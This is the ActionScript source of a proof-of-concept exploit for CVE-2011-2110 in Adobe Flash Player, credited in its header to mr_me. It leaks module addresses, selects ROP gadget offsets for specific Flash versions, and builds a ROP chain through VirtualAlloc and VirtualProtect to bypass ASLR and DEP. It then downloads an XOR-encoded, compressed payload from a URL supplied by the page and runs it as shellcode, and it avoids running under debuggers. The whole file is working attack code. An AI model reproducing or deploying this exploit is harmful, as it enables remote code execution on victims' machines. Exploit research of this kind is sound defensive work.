/*
 * poc exploit for CVE-2011-2110
 * thanks to AR Team (http://www.accessroot.com/arteam/site/download.php?view.331)
 * modified & verified safe code by mr_me - steventhomasseeley@gmail.com
 * bypasses aslr/dep
 * tested against IE/FF under WINXP/VISTA/WIN7
 * 19/6/2012
 */

package
{
	
	import flash.display.*;
	import flash.events.*;
	import flash.external.*;
	import flash.net.*;
	import flash.system.*;
	import flash.utils.*;

	// Main class
	public class Main extends MovieClip
	{
		public var content:ByteArray;
		public var pobj:uint;
		public var code:ByteArray;
		public var baseaddr:uint;
		public var content_len:uint;
		public var xchg_eax_esp_ret:uint;
		public var xchg_eax_esi_ret:uint;
		public var pop_eax_ret:uint;
		public var VirtualAlloc:uint;
		public var jmp_eax:uint;
		public var pop_ecx:uint;
		public var mov_eax_ecx:uint;
		public var inc_eax_ret:uint;
		public var dec_eax_ret:uint;
		public var to_eax:uint;
		public var virtualprotect:uint;

		// Main function
		public function Main()
		{
			var i:uint;
			var loader:URLLoader;
			var onLoadComplete:Function;

			// callback called when the download event is complete
			onLoadComplete = function (event:Event) : void
			{
				content = loader.data;	
				i = 0;
				while (i < content.length)
				{
					// every byte of the file is XORed with 122
					content[i] = content[i] ^ 122;
					var _loc_4:* = i + 1;
					i = _loc_4;
				}
				
				// then, the data is decompressed using zlib
				content.uncompress();
				content_len = content.length;
				
				var _loc_2:* = new ByteArray();
				code = _loc_2;
				_loc_2.position = 1024 * 1024;
				_loc_2.writeInt(2053274210);
				_loc_2.writeInt(2053339747);
				_loc_2.writeInt(2053405283);
				_loc_2.writeObject(_loc_2);
				exploit(_loc_2, _loc_2);
				
				// needed for stack alignment
				trace(_loc_2.length);
				return;
			}

			var param:* = root.loaderInfo.parameters;
			
			// Reads the "info" parameter from the HTML page
			var t_url:* = this.hexToBin(param["info"]);

			// Decode the URL in the "info" parameter
			while (i < t_url.length)
			{
				t_url[i] = t_url[i] ^ 122;
				i = (i + 1);
			}

			// Decompress the data using zlib
			t_url.uncompress();
			
			// setup the error 
			var error_arr:* = new ByteArray();
			error_arr.writeByte(2053208673);
			error_arr.writeObject(error_arr);
			
			// Takes the userAgent from the request
			var browser:* = ExternalInterface.call("eval", "navigator.userAgent");

			// we only target IE and FF...
			if (!(browser.toLowerCase().indexOf("msie") > 0 || browser.toLowerCase().indexOf("firefox") > 0))
			{
				// Error!
				error_arr.uncompress();
			}

			// If it is a 64 bits process or is embedded in a PDF or if the Flash version is an un-official version (debug version)
			// http://help.adobe.com/en_US/AS2LCR/Flash_10.0/00000896.html
			if (Capabilities.isDebugger || Capabilities.supports64BitProcesses || Capabilities.isEmbeddedInAcrobat)
			{
				// Error!
				error_arr.uncompress();
			}

			// Create the URLDownloader object
			var url_str:* = String(t_url);
			loader = new URLLoader();
			loader.dataFormat = URLLoaderDataFormat.BINARY;
			loader.addEventListener(Event.COMPLETE, onLoadComplete);
			loader.load(new URLRequest(t_url.toString()));
			return;
		}

		// Converts from an hex string to binary representation
		public function hexToBin(param1:String) : ByteArray
		{
			var _loc_2:String = null;
			var _loc_3:* = new ByteArray();
			var _loc_4:* = param1.length;
			var _loc_5:uint = 0;
			_loc_3.endian = Endian.LITTLE_ENDIAN;
			while (_loc_5 < _loc_4)
			{   
				_loc_2 = param1.charAt(_loc_5) + param1.charAt((_loc_5 + 1));
				_loc_3.writeByte(parseInt(_loc_2, 16));
				_loc_5 = _loc_5 + 2;
			}
			return _loc_3;
		}

		// the exploitation function
		public function exploit(... args) : void
		{
			var _loc_8:uint = 0;

			// First leak
			// this leak gets the baseaddress of Flash10s.ocx
			var n1:Number= new Number(parseFloat(String(args[1073741841])));
			var _loc_3:* = new ByteArray();
			_loc_3.position = 0;
			_loc_3.writeDouble(n1);
			var _loc_4:* = _loc_3[0] * 16777216 + _loc_3[1] * 65536 + _loc_3[2] * 256 + _loc_3[3];

			// Base address
			this.baseaddr = _loc_4;
			this.code.position = 0;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeInt((this.pobj - 1) + 16 + 1024 * 4 * 100);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.writeUnsignedInt(0x41424344);
			this.code.writeUnsignedInt(0x41424344);
			this.code.writeUnsignedInt(0x45464748);

			// With this loop, we store the 0x41414141 in the stack
			_loc_8 = 0;
			while (_loc_8 < 1024 * 100)
			{
				this.code.writeUnsignedInt(0x41414141);
				_loc_8 = _loc_8 + 1;
			}

			// Test for the vulnerable versions of Flash
			// Different test are done to calculate the ROP gadgets for every vulnerable version
			if (Capabilities.version.toLowerCase() == "win 10,3,181,14" || Capabilities.version.toLowerCase() == "win 10,3,181,22" || Capabilities.version.toLowerCase() == "win 10,3,181,23")
			{
				if (Capabilities.version.toLowerCase() == "win 10,3,181,14")
				{
					if (Capabilities.playerType.toLowerCase() == "activex")
					{
						this.xchg_eax_esp_ret = this.baseaddr - 4147053;
						this.xchg_eax_esi_ret = this.baseaddr - 3142921;
						this.pop_eax_ret = this.baseaddr - 4217672;
						this.VirtualAlloc = this.baseaddr + 681970 + 52;
						this.jmp_eax = this.baseaddr - 4189983;
						this.pop_ecx = this.baseaddr - 4217760;
						this.mov_eax_ecx = this.baseaddr - 3903324;
						this.inc_eax_ret = this.baseaddr - 4217676;
						this.dec_eax_ret = this.baseaddr - 3914790;
						this.to_eax = this.baseaddr - 3857175;
						this.virtualprotect = this.baseaddr + 681970;
					}
					if (Capabilities.playerType.toLowerCase() == "plugin")
					{
						this.xchg_eax_esp_ret = this.baseaddr - 4070001;
						this.xchg_eax_esi_ret = this.baseaddr - 3066633;
						this.pop_eax_ret = this.baseaddr - 4140104;
						this.VirtualAlloc = this.baseaddr + 681682;
						this.jmp_eax = this.baseaddr - 4112415;
						this.pop_ecx = this.baseaddr - 4140192;
						this.mov_eax_ecx = this.baseaddr - 3826124;
						this.inc_eax_ret = this.baseaddr - 4140108;
						this.dec_eax_ret = this.baseaddr - 3988570;
						this.to_eax = this.baseaddr - 3779959;
						this.virtualprotect = this.baseaddr + 681434;
					}
					if (!(Capabilities.playerType.toLowerCase() == "plugin" || Capabilities.playerType.toLowerCase() == "activex"))
					{
						this.code.uncompress();
					}
				}
				if (Capabilities.version.toLowerCase() == "win 10,3,181,22")
				{
					if (Capabilities.playerType.toLowerCase() == "activex")
					{
						this.code.uncompress();
					}
					if (Capabilities.playerType.toLowerCase() == "plugin")
					{
						this.xchg_eax_esp_ret = this.baseaddr - 4070081;
						this.xchg_eax_esi_ret = this.baseaddr - 3066633;
						this.pop_eax_ret = this.baseaddr - 4140184;
						this.VirtualAlloc = this.baseaddr + 681602;
						this.jmp_eax = this.baseaddr - 4112495;
						this.pop_ecx = this.baseaddr - 4140272;
						this.mov_eax_ecx = this.baseaddr - 3826412;
						this.inc_eax_ret = this.baseaddr - 4140188;
						this.dec_eax_ret = this.baseaddr - 3988622;
						this.to_eax = this.baseaddr - 3780231;
						this.virtualprotect = this.baseaddr + 681354;
					}
					if (!(Capabilities.playerType.toLowerCase() == "plugin" || Capabilities.playerType.toLowerCase() == "activex"))
					{
						this.code.uncompress();
					}
				}
				if (Capabilities.version.toLowerCase() == "win 10,3,181,23")
				{
					if (Capabilities.playerType.toLowerCase() == "activex")
					{
						this.xchg_eax_esp_ret = this.baseaddr - 4147431;
						this.xchg_eax_esi_ret = this.baseaddr - 3143049;
						this.pop_eax_ret = this.baseaddr - 4218184;
						this.VirtualAlloc = this.baseaddr + 681510;
						this.jmp_eax = this.baseaddr - 4190495;
						this.pop_ecx = this.baseaddr - 4218272;
						this.mov_eax_ecx = this.baseaddr - 3903692;
						this.inc_eax_ret = this.baseaddr - 4218188;
						this.dec_eax_ret = this.baseaddr - 3915158;
						this.to_eax = this.baseaddr - 3857511;
						this.virtualprotect = this.baseaddr + 681458;
					}
					if (Capabilities.playerType.toLowerCase() == "plugin")
					{
						this.code.uncompress();
					}
					if (!(Capabilities.playerType.toLowerCase() == "plugin" || Capabilities.playerType.toLowerCase() == "activex"))
					{
						this.code.uncompress();
					}
				}
			}
			else
			{	
				this.code.uncompress();
			}

			// rop
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.inc_eax_ret + 1));
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.pop_ecx);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.xchg_eax_esp_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.xchg_eax_esi_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.pop_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.VirtualAlloc);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.jmp_eax);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.pop_ecx);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(0);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(131072);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(4096);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(64);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.writeUnsignedInt(2421721856);
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.mov_eax_ecx);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.pop_ecx);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.writeUnsignedInt(1435233421);
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.mov_eax_ecx);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.pop_ecx);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.writeUnsignedInt(1074135008);
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.mov_eax_ecx);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.inc_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.dec_eax_ret);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.to_eax);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(this.virtualprotect);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.pobj - 1) + 16 + 1024 * 4 * 100 + 292);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.pobj - 1) + 16 + 1024 * 4 * 100 + 292);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(131072);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(64);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.pobj - 1) + 4);
			this.code.endian = Endian.BIG_ENDIAN;
			
			// previous pe loader stub removed, just to be safe
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			this.code.writeUnsignedInt(0x90909090);
			
			// shellcode
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.writeBytes(this.content, 0, this.content.length);

			// Second leak
			var _loc_5:Number = new Number(parseFloat(String(args[0x3FFFFFAD])));

			var _loc_6:* = new ByteArray();
			_loc_6.position = 0;
			_loc_6.writeDouble(_loc_5);
			var _loc_7:* = _loc_6[0] * 16777216 + _loc_6[1] * 65536 + _loc_6[2] * 256 + _loc_6[3];
			this.pobj = _loc_7;

			_loc_8 = 0;
			this.pobj = this.pobj + 0x37;

			// with this loop, we store a reference for the leaked address in the stack
			_loc_8 = 0;
			while (_loc_8 < 100)
			{
				this.code.writeInt(this.pobj);
				_loc_8 = _loc_8 + 1;
			}

			// third leak
			var _loc_9:Number = new Number(parseFloat(String(args[0x3FFFFFB9])));
			var _leak_3:* = new ByteArray();
			_leak_3.position = 0;
			_leak_3.writeDouble(_loc_9);
			_loc_4 = _leak_3[0] * 16777216 + _leak_3[1] * 65536 + _leak_3[2] * 256 + _leak_3[3];
			this.pobj = _loc_4 + 2;

			// dont remove, the stack will change
			ExternalInterface.call("", ""); 

			// again, a reference to the leaked address is stored in the stack
			_loc_8 = 0;
			while (_loc_8 < 100)
			{
				this.code.writeInt(this.pobj);
				_loc_8 = _loc_8 + 1;
			}

			this.code.position = 0;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeInt((this.pobj - 1) + 16 + 1024 * 4 * 100);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.position = 409872;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.pobj - 1) + 16 + 1024 * 4 * 100 + 292);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.pobj - 1) + 16 + 1024 * 4 * 100 + 292);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(131072);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt(64);
			this.code.endian = Endian.BIG_ENDIAN;
			this.code.endian = Endian.LITTLE_ENDIAN;
			this.code.writeUnsignedInt((this.pobj - 1) + 4);
			this.code.endian = Endian.BIG_ENDIAN;
			
			// This is the trigger.
			Number(args[0x3FFFFFB9]);
			return;
		}
	}
}
